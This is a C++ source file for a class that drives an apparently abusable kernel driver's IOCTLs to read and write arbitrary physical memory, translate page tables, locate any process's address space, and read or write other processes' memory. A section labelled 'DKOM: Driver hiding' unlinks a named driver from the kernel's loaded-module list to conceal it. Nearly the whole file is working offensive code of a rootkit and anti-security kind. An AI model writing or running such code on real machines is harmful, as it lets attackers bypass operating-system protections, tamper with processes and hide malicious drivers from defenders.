#include "CorDrv.hpp"
#include <cstring>
#include <cstdio>
#include <cstdlib>
#include <psapi.h>
#pragma comment(lib, "psapi.lib")

CorDrv::~CorDrv() { Close(); }

CorDrv::CorDrv(CorDrv&& Other) noexcept
    : m_Device(Other.m_Device), m_PoolBlockCount(Other.m_PoolBlockCount), m_SystemDTB(Other.m_SystemDTB) {
    memcpy(m_PoolBlocks, Other.m_PoolBlocks, sizeof(m_PoolBlocks));
    Other.m_Device = INVALID_HANDLE_VALUE;
    Other.m_PoolBlockCount = 0;
    Other.m_SystemDTB = 0;
}

CorDrv& CorDrv::operator=(CorDrv&& Other) noexcept {
    if (this != &Other) {
        Close();
        m_Device = Other.m_Device;
        m_PoolBlockCount = Other.m_PoolBlockCount;
        m_SystemDTB = Other.m_SystemDTB;
        memcpy(m_PoolBlocks, Other.m_PoolBlocks, sizeof(m_PoolBlocks));
        Other.m_Device = INVALID_HANDLE_VALUE;
        Other.m_PoolBlockCount = 0;
        Other.m_SystemDTB = 0;
    }
    return *this;
}

bool CorDrv::Initialize() {
    if (IsValid()) return true;
    m_Device = CreateFileA(CORMEM_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, nullptr,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, nullptr);
    if (!IsValid()) return false;
    if (!GetPoolBlockCount(&m_PoolBlockCount) || m_PoolBlockCount > CORMEM_MAX_POOL_BLOCKS) { Close(); return false; }
    for (uint32_t i = 0; i < m_PoolBlockCount; i++) { if (!MapPoolBlock(i)) { Close(); return false; } }
    return true;
}

void CorDrv::Close() {
    RestoreDriver();
    if (IsValid()) { CloseHandle(m_Device); m_Device = INVALID_HANDLE_VALUE; }
    m_PoolBlockCount = 0; m_SystemDTB = 0;
    memset(m_PoolBlocks, 0, sizeof(m_PoolBlocks));
}

bool CorDrv::SendIoctl(DWORD IoControlCode, void* InBuffer, DWORD InSize,
    void* OutBuffer, DWORD OutSize, DWORD* BytesReturned) {
    DWORD br = 0;
    BOOL r = DeviceIoControl(m_Device, IoControlCode, InBuffer, InSize, OutBuffer, OutSize, &br, nullptr);
    if (BytesReturned) *BytesReturned = br;
    return r != FALSE;
}

bool CorDrv::MapPoolBlock(uint32_t Index) {
    uint32_t input = Index;
    CORMEM_MAP_POOL_OUT output = {};
    DWORD br = 0;
    if (!SendIoctl(IOCTL_CORMEM_MAP_POOL, &input, sizeof(input), &output, sizeof(output), &br) || br == 0)
        return false;
    m_PoolBlocks[Index] = { output.UserAddress, output.KernelAddress, output.PhysicalAddress, output.Size };
    return true;
}

bool CorDrv::GetPoolBlockCount(uint32_t* Count) {
    uint32_t output = 0; DWORD br = 0;
    if (!SendIoctl(IOCTL_CORMEM_GET_POOL_BLOCK_COUNT, nullptr, 0, &output, sizeof(output), &br) || br == 0)
        return false;
    *Count = output; return true;
}

uint64_t CorDrv::MapPhysicalMemory(uint64_t PhysicalAddress) {
    uint64_t in = PhysicalAddress, out = 0; DWORD br = 0;
    if (!SendIoctl(IOCTL_CORMEM_MAP_PHYS_MEMORY, &in, sizeof(in), &out, sizeof(out), &br)) return 0;
    return br > 0 ? out : 0;
}

bool CorDrv::UnmapPhysicalMemory(uint64_t MappedAddress, uint64_t PhysicalAddress) {
    CORMEM_UNMAP_PHYS_IN in = { MappedAddress, PhysicalAddress };
    return SendIoctl(IOCTL_CORMEM_UNMAP_PHYS_MEMORY, &in, sizeof(in), nullptr, 0);
}

uint64_t CorDrv::LinearToPhys(uint64_t VirtualAddress) {
    uint64_t in = VirtualAddress, out = 0;
    SendIoctl(IOCTL_CORMEM_LINEAR_TO_PHYS, &in, sizeof(in), &out, sizeof(out));
    return out;
}

bool CorDrv::ReadIo(uint32_t Width, uint64_t Address, uint32_t* OutValue) {
    CORMEM_READ_IO_IN in = { Width, Address };
    uint32_t out = 0; DWORD br = 0;
    if (!SendIoctl(IOCTL_CORMEM_READ_IO, &in, sizeof(in), &out, sizeof(out), &br) || br == 0) return false;
    *OutValue = out; return true;
}

bool CorDrv::WriteIo(uint32_t Width, uint64_t Address, uint32_t Value) {
    CORMEM_WRITE_IO_IN in = { Width, Address, Value };
    return SendIoctl(IOCTL_CORMEM_WRITE_IO, &in, sizeof(in), nullptr, 0);
}

bool CorDrv::AllocBuffer(uint64_t Size, uint32_t Alignment, uint32_t Flags,
    uint64_t* PhysAddress, uint64_t* UserAddress) {
    CORMEM_ALLOC_BUFFER_IN in = { Size, Alignment, Flags };
    CORMEM_ALLOC_BUFFER_OUT out = {}; DWORD br = 0;
    if (!SendIoctl(IOCTL_CORMEM_ALLOC_BUFFER, &in, sizeof(in), &out, sizeof(out), &br) || br == 0) return false;
    *PhysAddress = out.PhysicalAddress;
    *UserAddress = MapPhysToUser(out.PhysicalAddress);
    return true;
}

bool CorDrv::FreeBuffer(uint64_t UserAddress) {
    uint64_t pa = MapUserToPhys(UserAddress);
    if (!pa) return false;
    return SendIoctl(IOCTL_CORMEM_FREE_BUFFER, &pa, sizeof(pa), nullptr, 0);
}

uint64_t CorDrv::MapBuffer(uint64_t Address, uint64_t Size, uint64_t Param) {
    SYSTEM_INFO si = {}; GetSystemInfo(&si);
    Size += Address & (si.dwPageSize - 1);
    CORMEM_MAP_BUFFER_IN in = { Address, Size, Param };
    uint64_t out = 0;
    SendIoctl(IOCTL_CORMEM_MAP_BUFFER, &in, sizeof(in), &out, sizeof(out));
    return out;
}

bool CorDrv::UnmapBuffer(uint64_t MappedAddress) {
    return SendIoctl(IOCTL_CORMEM_UNMAP_BUFFER, &MappedAddress, sizeof(MappedAddress), nullptr, 0);
}

bool CorDrv::AllocPhysMemory(uint64_t P0, uint64_t P1, uint64_t P2, uint64_t P3,
    uint64_t* OutPhys, uint64_t* OutParam) {
    CORMEM_ALLOC_PHYS_IN in = { P0, P1, P2, P3 };
    CORMEM_ALLOC_PHYS_OUT out = {}; DWORD br = 0;
    if (!SendIoctl(IOCTL_CORMEM_ALLOC_PHYS_MEMORY, &in, sizeof(in), &out, sizeof(out), &br) || br == 0) return false;
    *OutPhys = out.PhysicalAddress; *OutParam = out.Param1; return true;
}

bool CorDrv::FreePhysMemory(uint64_t PhysAddress) {
    return SendIoctl(IOCTL_CORMEM_FREE_PHYS_MEMORY, &PhysAddress, sizeof(PhysAddress), nullptr, 0);
}

uint64_t CorDrv::MapPhysToUser(uint64_t PA) const {
    for (uint32_t i = 0; i < m_PoolBlockCount; i++) { auto& b = m_PoolBlocks[i]; if (PA >= b.PhysicalAddress && PA < b.PhysicalAddress + b.Size) return b.UserAddress + (PA - b.PhysicalAddress); } return 0;
}
uint64_t CorDrv::MapPhysToKernel(uint64_t PA) const {
    for (uint32_t i = 0; i < m_PoolBlockCount; i++) { auto& b = m_PoolBlocks[i]; if (PA >= b.PhysicalAddress && PA < b.PhysicalAddress + b.Size) return b.KernelAddress + (PA - b.PhysicalAddress); } return 0;
}
uint64_t CorDrv::MapUserToPhys(uint64_t UA) const {
    for (uint32_t i = 0; i < m_PoolBlockCount; i++) { auto& b = m_PoolBlocks[i]; if (UA >= b.UserAddress && UA < b.UserAddress + b.Size) return b.PhysicalAddress + (UA - b.UserAddress); } return 0;
}
uint64_t CorDrv::MapKernelToPhys(uint64_t KA) const {
    for (uint32_t i = 0; i < m_PoolBlockCount; i++) { auto& b = m_PoolBlocks[i]; if (KA >= b.KernelAddress && KA < b.KernelAddress + b.Size) return b.PhysicalAddress + (KA - b.KernelAddress); } return 0;
}
uint64_t CorDrv::MapKernelToUser(uint64_t KA) const {
    for (uint32_t i = 0; i < m_PoolBlockCount; i++) { auto& b = m_PoolBlocks[i]; if (KA >= b.KernelAddress && KA < b.KernelAddress + b.Size) return b.UserAddress + (KA - b.KernelAddress); } return 0;
}
uint64_t CorDrv::MapUserToKernel(uint64_t UA) const {
    for (uint32_t i = 0; i < m_PoolBlockCount; i++) { auto& b = m_PoolBlocks[i]; if (UA >= b.UserAddress && UA < b.UserAddress + b.Size) return b.KernelAddress + (UA - b.UserAddress); } return 0;
}

bool CorDrv::ReadPhysicalMemory(uint64_t PhysicalAddress, void* Buffer, size_t Size) {
    uint64_t mapped = MapBuffer(PhysicalAddress, Size, 0);
    if (!mapped) return false;
    memcpy(Buffer, reinterpret_cast<void*>(mapped), Size);
    UnmapBuffer(mapped);
    return true;
}

bool CorDrv::WritePhysicalMemory(uint64_t PhysicalAddress, const void* Buffer, size_t Size) {
    uint64_t mapped = MapBuffer(PhysicalAddress, Size, 0);
    if (!mapped) return false;
    memcpy(reinterpret_cast<void*>(mapped), Buffer, Size);
    UnmapBuffer(mapped);
    return true;
}

bool CorDrv::TryFindDTBFromLowStub(uint8_t* LowStub1M, uint64_t& OutDTB, uint64_t& OutKernelEntry) {
    for (uint32_t offset = 0x1000; offset < 0x100000; offset += 0x1000) {
        uint64_t sig = *reinterpret_cast<uint64_t*>(LowStub1M + offset);
        if ((sig & PSB_SIGNATURE_MASK) != PSB_SIGNATURE_VALUE)
            continue;

        uint64_t kernelEntry = *reinterpret_cast<uint64_t*>(LowStub1M + offset + PSB_KERNEL_ENTRY_OFFSET);
        if ((kernelEntry & KERNEL_VA_MASK) != KERNEL_VA_EXPECTED)
            continue;

        uint64_t pml4 = *reinterpret_cast<uint64_t*>(LowStub1M + offset + PSB_PML4_OFFSET);
        if (pml4 & PML4_INVALID_BITS_MASK)
            continue;
        if (pml4 == 0 || pml4 > 0x100000000ULL)
            continue;

        OutDTB = pml4;
        OutKernelEntry = kernelEntry;
        return true;
    }
    return false;
}

bool CorDrv::ValidatePML4Page(uint64_t DTB, uint64_t MaxPhysAddr) {
    uint64_t pml4Page[512] = {};
    if (!ReadPhysicalMemory(DTB, pml4Page, sizeof(pml4Page)))
        return false;
    uint32_t validEntries = 0, kernelEntries = 0;
    for (int i = 0; i < 512; i++) {
        uint64_t entry = pml4Page[i];
        if (!(entry & PAGE_PRESENT)) continue;
        uint64_t pfn = entry & 0x000FFFFFFFFFF000ULL;
        if (pfn >= MaxPhysAddr) return false;
        validEntries++;
        if (i >= 256) kernelEntries++;
    }
    return validEntries > 0 && kernelEntries > 0;
}

uint64_t CorDrv::FindSystemDTB() {
    uint8_t* lowStub = new uint8_t[0x100000];
    if (!lowStub) return 0;
    for (uint32_t offset = 0; offset < 0x100000; offset += 0x1000) {
        if (!ReadPhysicalMemory(offset, lowStub + offset, 0x1000))
            memset(lowStub + offset, 0, 0x1000);
    }
    uint64_t dtb = 0, kernelEntry = 0;
    if (TryFindDTBFromLowStub(lowStub, dtb, kernelEntry)) {
        delete[] lowStub;
        if (ValidatePML4Page(dtb, 0x8000000000ULL)) {
            printf("dtb: 0x%llX\n", (unsigned long long)dtb);
            m_SystemDTB = dtb;
            return dtb;
        }
        printf("dtb validation failed.\n");
    }
    else {
        delete[] lowStub;
    }
    return 0;
}

uint64_t CorDrv::GetSystemEprocessVA() {
    auto NtQuerySystemInformation = reinterpret_cast<PFN_NtQuerySystemInformation>(
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation")
        );
    if (!NtQuerySystemInformation)
        return 0;

    ULONG bufferLength = 0;
    ULONG returnSize = 0;
    void* buffer = malloc(1);

    while (NtQuerySystemInformation(SystemExtendedHandleInformation, buffer, bufferLength, &returnSize) != 0) {
        bufferLength = returnSize;
        free(buffer);
        buffer = malloc(bufferLength);
        if (!buffer) return 0;
        returnSize = 0;
    }

    auto* handleInfo = static_cast<SYSTEM_HANDLE_INFORMATION_EX*>(buffer);
    uint64_t eprocess = 0;

    if (handleInfo) {
        for (ULONG_PTR i = 0; i < handleInfo->NumberOfHandles; i++) {
            auto& h = handleInfo->Handles[i];
            if (h.UniqueProcessId == 4 && h.HandleAttributes == 0x102A) {
                eprocess = reinterpret_cast<uint64_t>(h.Object);
                break;
            }
        }
    }

    free(buffer);
    return eprocess;
}

uint64_t CorDrv::TranslateVirtualAddress(uint64_t DTB, uint64_t VirtualAddress) {
    uint64_t pml4Idx = (VirtualAddress >> 39) & 0x1FF;
    uint64_t pdptIdx = (VirtualAddress >> 30) & 0x1FF;
    uint64_t pdIdx = (VirtualAddress >> 21) & 0x1FF;
    uint64_t ptIdx = (VirtualAddress >> 12) & 0x1FF;
    uint64_t offset = VirtualAddress & 0xFFF;

    uint64_t pml4e = 0;
    if (!ReadPhysicalMemory((DTB & ~0xFFFULL) + pml4Idx * 8, &pml4e, 8) || !(pml4e & PAGE_PRESENT))
        return 0;

    uint64_t pdpte = 0;
    if (!ReadPhysicalMemory((pml4e & 0x000FFFFFFFFFF000ULL) + pdptIdx * 8, &pdpte, 8) || !(pdpte & PAGE_PRESENT))
        return 0;
    if (pdpte & PAGE_LARGE)
        return (pdpte & 0x000FFFFFC0000000ULL) + (VirtualAddress & (PAGE_1GB - 1));

    uint64_t pde = 0;
    if (!ReadPhysicalMemory((pdpte & 0x000FFFFFFFFFF000ULL) + pdIdx * 8, &pde, 8) || !(pde & PAGE_PRESENT))
        return 0;
    if (pde & PAGE_LARGE)
        return (pde & 0x000FFFFFFFE00000ULL) + (VirtualAddress & (PAGE_2MB - 1));

    uint64_t pte = 0;
    if (!ReadPhysicalMemory((pde & 0x000FFFFFFFFFF000ULL) + ptIdx * 8, &pte, 8) || !(pte & PAGE_PRESENT))
        return 0;

    return (pte & 0x000FFFFFFFFFF000ULL) + offset;
}

uint64_t CorDrv::FindProcessDTB(DWORD Pid) {
    if (m_SystemDTB == 0 && FindSystemDTB() == 0)
        return 0;

    uint64_t systemEprocessVA = GetSystemEprocessVA();
    if (!systemEprocessVA)
        return 0;

    uint64_t listHeadVA = systemEprocessVA + EProcess::ActiveProcessLinks;
    uint64_t listHeadPhys = TranslateVirtualAddress(m_SystemDTB, listHeadVA);
    if (!listHeadPhys)
        return 0;

    uint64_t firstFlink = 0;
    ReadPhysicalMemory(listHeadPhys, &firstFlink, sizeof(firstFlink));

    uint64_t currentFlink = firstFlink;
    uint32_t count = 0;

    do {
        uint64_t eprocessVA = currentFlink - EProcess::ActiveProcessLinks;
        uint64_t eprocessPhys = TranslateVirtualAddress(m_SystemDTB, eprocessVA);
        if (eprocessPhys == 0) break;

        uint64_t currentPid = 0;
        ReadPhysicalMemory(eprocessPhys + EProcess::UniqueProcessId, &currentPid, sizeof(currentPid));

        if (currentPid == Pid) {
            uint64_t processDTB = 0;
            ReadPhysicalMemory(eprocessPhys + EProcess::DirectoryTableBase, &processDTB, sizeof(processDTB));
            return processDTB;
        }

        uint64_t flinkPhys = TranslateVirtualAddress(m_SystemDTB, currentFlink);
        if (flinkPhys == 0) break;

        uint64_t nextFlink = 0;
        ReadPhysicalMemory(flinkPhys, &nextFlink, sizeof(nextFlink));

        if (nextFlink == firstFlink || nextFlink == 0) break;
        currentFlink = nextFlink;
        count++;
    } while (count < 4096);

    printf("pid %u not found\n", Pid);
    return 0;
}

bool CorDrv::ReadProcessMemory(uint64_t DTB, uint64_t VirtualAddress, void* Buffer, size_t Size) {
    uint8_t* dst = static_cast<uint8_t*>(Buffer);
    size_t remaining = Size;
    uint64_t va = VirtualAddress;
    while (remaining > 0) {
        uint64_t phys = TranslateVirtualAddress(DTB, va);
        if (phys == 0) return false;
        size_t chunk = min(remaining, (size_t)(PAGE_4KB - (va & 0xFFF)));
        if (!ReadPhysicalMemory(phys, dst, chunk)) return false;
        dst += chunk; va += chunk; remaining -= chunk;
    }
    return true;
}

bool CorDrv::WriteProcessMemory(uint64_t DTB, uint64_t VirtualAddress, const void* Buffer, size_t Size) {
    const uint8_t* src = static_cast<const uint8_t*>(Buffer);
    size_t remaining = Size;
    uint64_t va = VirtualAddress;
    while (remaining > 0) {
        uint64_t phys = TranslateVirtualAddress(DTB, va);
        if (phys == 0) return false;
        size_t chunk = min(remaining, (size_t)(PAGE_4KB - (va & 0xFFF)));
        if (!WritePhysicalMemory(phys, src, chunk)) return false;
        src += chunk; va += chunk; remaining -= chunk;
    }
    return true;
}

// ---- DKOM: Driver hiding ----

static uint32_t PeRvaToFileOffset(IMAGE_NT_HEADERS64* nt, uint32_t rva) {
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (rva >= sec->VirtualAddress && rva < sec->VirtualAddress + sec->Misc.VirtualSize)
            return sec->PointerToRawData + (rva - sec->VirtualAddress);
    }
    return rva;
}

uint64_t CorDrv::GetNtoskrnlBase(char* OutName, size_t NameSize) {
    LPVOID drivers[1024] = {};
    DWORD cbNeeded = 0;
    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) return 0;
    DWORD count = cbNeeded / sizeof(LPVOID);
    for (DWORD i = 0; i < count; i++) {
        char name[MAX_PATH] = {};
        if (!GetDeviceDriverBaseNameA(drivers[i], name, MAX_PATH)) continue;
        if (_stricmp(name, "ntoskrnl.exe") == 0 || _stricmp(name, "ntkrnlmp.exe") == 0 ||
            _stricmp(name, "ntkrnlpa.exe") == 0 || _stricmp(name, "ntkrpamp.exe") == 0) {
            if (OutName && NameSize > 0) strncpy_s(OutName, NameSize, name, _TRUNCATE);
            return reinterpret_cast<uint64_t>(drivers[i]);
        }
    }
    return 0;
}

uint64_t CorDrv::ResolvePsLoadedModuleList(uint64_t NtBase, const char* NtName) {
    char sysDir[MAX_PATH] = {};
    GetSystemDirectoryA(sysDir, MAX_PATH);
    char fullPath[MAX_PATH] = {};
    snprintf(fullPath, MAX_PATH, "%s\\%s", sysDir, NtName);

    HANDLE hFile = CreateFileA(fullPath, GENERIC_READ, FILE_SHARE_READ, nullptr,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return 0;

    DWORD fileSize = GetFileSize(hFile, nullptr);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) { CloseHandle(hFile); return 0; }

    uint8_t* data = new uint8_t[fileSize];
    DWORD bytesRead = 0;
    if (!ReadFile(hFile, data, fileSize, &bytesRead, nullptr) || bytesRead != fileSize) {
        CloseHandle(hFile); delete[] data; return 0;
    }
    CloseHandle(hFile);

    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(data);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { delete[] data; return 0; }
    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(data + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) { delete[] data; return 0; }

    auto& expDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!expDir.VirtualAddress || !expDir.Size) { delete[] data; return 0; }

    auto* exp     = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(data + PeRvaToFileOffset(nt, expDir.VirtualAddress));
    auto* names   = reinterpret_cast<uint32_t*>(data + PeRvaToFileOffset(nt, exp->AddressOfNames));
    auto* ords    = reinterpret_cast<uint16_t*>(data + PeRvaToFileOffset(nt, exp->AddressOfNameOrdinals));
    auto* funcs   = reinterpret_cast<uint32_t*>(data + PeRvaToFileOffset(nt, exp->AddressOfFunctions));

    uint64_t result = 0;
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char* sym = reinterpret_cast<const char*>(data + PeRvaToFileOffset(nt, names[i]));
        if (strcmp(sym, "PsLoadedModuleList") == 0) {
            result = NtBase + funcs[ords[i]];
            break;
        }
    }
    delete[] data;
    return result;
}

bool CorDrv::HideDriver(const wchar_t* DriverBaseName) {
    if (m_SystemDTB == 0) return false;

    char ntName[MAX_PATH] = {};
    uint64_t ntBase = GetNtoskrnlBase(ntName, sizeof(ntName));
    if (!ntBase) return false;

    uint64_t listHeadVA = ResolvePsLoadedModuleList(ntBase, ntName);
    if (!listHeadVA) return false;

    uint64_t listHeadPhys = TranslateVirtualAddress(m_SystemDTB, listHeadVA);
    if (!listHeadPhys) return false;

    uint64_t currentEntryVA = 0;
    if (!ReadPhysicalMemory(listHeadPhys, &currentEntryVA, sizeof(currentEntryVA))) return false;

    for (uint32_t iterations = 0; currentEntryVA != listHeadVA && iterations < 512; iterations++) {
        uint64_t entryPhys = TranslateVirtualAddress(m_SystemDTB, currentEntryVA);
        if (!entryPhys) break;

        uint16_t nameLen  = 0;
        uint64_t nameBufVA = 0;
        ReadPhysicalMemory(entryPhys + LdrEntry::BaseDllNameLength, &nameLen,  sizeof(nameLen));
        ReadPhysicalMemory(entryPhys + LdrEntry::BaseDllNameBuffer, &nameBufVA, sizeof(nameBufVA));

        bool found = false;
        if (nameLen > 0 && nameLen <= 256 && nameBufVA != 0) {
            wchar_t nameBuf[128] = {};
            uint64_t nameBufPhys = TranslateVirtualAddress(m_SystemDTB, nameBufVA);
            if (nameBufPhys) {
                ReadPhysicalMemory(nameBufPhys, nameBuf, nameLen);
                found = (_wcsicmp(nameBuf, DriverBaseName) == 0);
            }
        }

        if (found) {
            uint64_t entryFlink = 0, entryBlink = 0;
            ReadPhysicalMemory(entryPhys + LdrEntry::InLoadOrderFlink, &entryFlink, sizeof(entryFlink));
            ReadPhysicalMemory(entryPhys + LdrEntry::InLoadOrderBlink, &entryBlink, sizeof(entryBlink));
            if (!entryFlink || !entryBlink) return false;

            m_HiddenEntryVA = currentEntryVA;
            m_HiddenEntryFlink = entryFlink;
            m_HiddenEntryBlink = entryBlink;

            // prev->Flink = entry->Flink
            uint64_t prevPhys = TranslateVirtualAddress(m_SystemDTB, entryBlink);
            if (!prevPhys) return false;
            WritePhysicalMemory(prevPhys + LdrEntry::InLoadOrderFlink, &entryFlink, sizeof(entryFlink));

            // next->Blink = entry->Blink
            uint64_t nextPhys = TranslateVirtualAddress(m_SystemDTB, entryFlink);
            if (!nextPhys) return false;
            WritePhysicalMemory(nextPhys + LdrEntry::InLoadOrderBlink, &entryBlink, sizeof(entryBlink));

            return true;
        }

        // Advance to next entry via Flink
        uint64_t nextFlink = 0;
        ReadPhysicalMemory(entryPhys + LdrEntry::InLoadOrderFlink, &nextFlink, sizeof(nextFlink));
        if (!nextFlink || nextFlink == currentEntryVA) break;
        currentEntryVA = nextFlink;
    }
    return false;
}

bool CorDrv::RestoreDriver() {
    if (!m_SystemDTB || !m_HiddenEntryVA || !m_HiddenEntryFlink || !m_HiddenEntryBlink)
        return false;

    // Restore prev->Flink
    uint64_t prevPhys = TranslateVirtualAddress(m_SystemDTB, m_HiddenEntryBlink);
    if (prevPhys) {
        WritePhysicalMemory(prevPhys + LdrEntry::InLoadOrderFlink, &m_HiddenEntryVA, sizeof(m_HiddenEntryVA));
    }

    // Restore next->Blink
    uint64_t nextPhys = TranslateVirtualAddress(m_SystemDTB, m_HiddenEntryFlink);
    if (nextPhys) {
        WritePhysicalMemory(nextPhys + LdrEntry::InLoadOrderBlink, &m_HiddenEntryVA, sizeof(m_HiddenEntryVA));
    }

    m_HiddenEntryVA = 0;
    m_HiddenEntryFlink = 0;
    m_HiddenEntryBlink = 0;

    return true;
}